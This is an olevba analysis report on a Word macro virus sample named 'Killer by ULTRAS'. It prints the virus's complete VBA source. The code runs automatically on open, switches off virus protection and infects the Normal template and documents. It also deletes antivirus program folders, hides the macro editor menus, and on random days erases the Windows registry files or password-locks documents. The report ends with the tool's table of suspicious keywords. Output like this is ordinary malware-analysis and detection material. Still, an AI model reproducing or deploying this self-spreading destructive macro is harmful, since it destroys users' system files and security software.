olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Killer-016d0daf900d5233304a82643750815e5c6c9ec9
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Killer-016d0daf900d5233304a82643750815e5c6c9ec9 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Killer.bas 
in file: Virus.MSWord.Killer-016d0daf900d5233304a82643750815e5c6c9ec9 - OLE stream: 'Macros/VBA/Killer'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error GoTo Killer
Call KillAV
Application.ScreenUpdating = False
Application.DisplayAlerts = wdAlertsNone
Options.VirusProtection = False
DocInfect = False
GlobInfect = False
For b = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(b).Name = "Killer" Then
DocInfect = True
End If
Next
For U = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(U).Name = "Killer" Then
GlobInfect = True
End If
Next
If DocInfect = False Then
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Killer", Object:=wdOrganizerObjectProjectItems
ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
End If
If GlobInfect = False Then
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Killer", Object:=wdOrganizerObjectProjectItems
Options.SaveNormalPrompt = False
End If
Application.DisplayAlerts = wdAlertsAll
Call Killer
Killer:
End Sub

Sub FilePrint()
On Error GoTo Killer
UKil.Show
With ActiveDocument.Range(Start:=0, End:=0)
.InsertBefore "KILLER BY ULTRAS"
.Font.Name = "Impact"
.Font.Size = 36
.Font.ColorIndex = 6
End With
Killer:
Dialogs(wdDialogFilePrint).Show
End Sub

Sub KillAV()
On Error GoTo Killer
Kill "C:\Program Files\AntiViral Toolkit Pro\*.*"
Kill "C:\Program Files\Command Software\F-PROT95\*.*"
Kill "C:\Program Files\McAfee\VirusScan\*.*"
Kill "C:\Program Files\Norton AntiVirus\*.*"
Kill "C:\PC-Cillin 95\*.*"
Kill "C:\PC-Cillin 97\*.*"
Kill "C:\f-macro\*.*"
Kill "C:\Toolkit\FindVirus\*.*"
Kill "C:\Tbavw95\*.*"
Kill "C:\Vdoc\*.*"
Killer:
End Sub

Sub ToolsMacro()
beep
MsgBox "Impossible open this function", vbCritical + vbOKOnly + vbMsgBoxHelpButton + vbDefaultButton2, "Error"
End Sub

Sub ViewVBCode()
beep
MsgBox "Function does not answer system requests" & vbCrLf & "", vbExclamation + vbOKOnly + vbMsgBoxHelpButton + vbDefaultButton2, "Microsoft Visual Basic"
End Sub

Sub FileTemplates()
beep
End Sub

Sub ToolsCustomize()
beep
End Sub

Sub Killer()
On Error GoTo Killer
K = Int(Rnd() * 30) + 1
If Day(Now()) = K Then
MsgBox "You Infected Killer by ULTRAS", vbCritical + vbOKOnly, "ULTRAS"
SetAttr "c:\windows\system.dat", 0
SetAttr "c:\windows\system.da0", 0
Kill "c:\windows\system.dat"
Kill "c:\windows\system.da0"
End If
U = Int(Rnd() * 25) + 1
If Day(Now()) = U Then
ActiveDocument.Password = "KILLER"
ActiveDocument.Save
End If
Killer:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|open                |May open a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

